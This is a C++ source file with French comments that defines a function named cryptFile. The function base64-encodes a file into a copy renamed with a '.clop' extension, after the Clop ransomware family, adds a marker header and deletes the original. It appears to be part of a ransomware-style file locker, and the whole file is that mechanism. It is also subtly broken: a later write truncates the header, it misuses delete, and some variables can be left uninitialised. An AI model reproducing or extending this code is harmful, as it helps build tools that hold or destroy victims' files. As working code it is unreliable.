#include <iostream>
#include <fstream>
#include <string>
#include "base64.cpp"
#include <boost/algorithm/string/replace.hpp>

void cryptFile(std::string path)
{
    // Déclaration de variables
    std::ifstream::pos_type size;
    std::string base64;
    int headerSize;
    char* memblock;
    int lastDot;

    // Savoir si il y a plusieurs points dans le path
    for(int i = 0; i < path.length(); i++)
    {
        if(path[i] == '.')
        {
            // Mettre la position du dernier point dans lastDot
            lastDot = i;
        }
    }

    // Recuperer l'extention de fichier
    std::string extension = path.substr(lastDot + 1);

    // Mise en place du header
    std::string header = "fileExt=" + extension + "|";

    // Ecriture
    std::string newPath = path;
    boost::replace_all(newPath,("." + extension),".clop");

    std::ofstream fileWrite(newPath.c_str(),std::ios::out | std::ios::binary | std::ios::ate);
    if(fileWrite.is_open())
    {
        fileWrite.seekp(0,std::ios::beg);
        fileWrite << header;
        fileWrite << "b4d4c077f070bfc6205bca7d1acfadff";
        headerSize =  fileWrite.tellp();
    }

    // Ouvrir le fichier en binaire
    std::ifstream fileRead(path.c_str(), std::ios::in | std::ios::binary | std::ios::ate); //on ouvre le fichier en binaire

    // Si le fichier est ouvret
    if (fileRead.is_open())
    {
        size = fileRead.tellg(); // Récupère la taille en octet du fichier
        memblock = new char [size];
        fileRead.seekg (0, std::ios::beg);
        fileRead.read (memblock, size); // Associer a memblcok les bytes du fichier

        const unsigned char* base64_memblock;
        base64_memblock = reinterpret_cast <const unsigned char*>(memblock);
        base64 = base64_encode(base64_memblock,(int)size);

        fileRead.close();

        if(size == 0)
        {
            std::cout << "[ERR] Could not open " + path << std::endl;
            std::cout << std::endl;
            return;
        }
    }
    else std::cout << "[ERR] Could not open " + path << std::endl;

    std::ofstream ecriture(newPath.c_str(), std::ios::out | std::ios::binary | std::ios::ate);

    // Si le fichier est ouvert
    if(ecriture.is_open())
    {
        ecriture.seekp(headerSize, std::ios::beg);
        ecriture << base64;

        std::cout << "[INFO] Done !" << std::endl;
    }
    else std::cout << "Erreur d'ouverture de fichier en ecriture" << std::endl;

    delete memblock;

    remove(path.c_str());
}
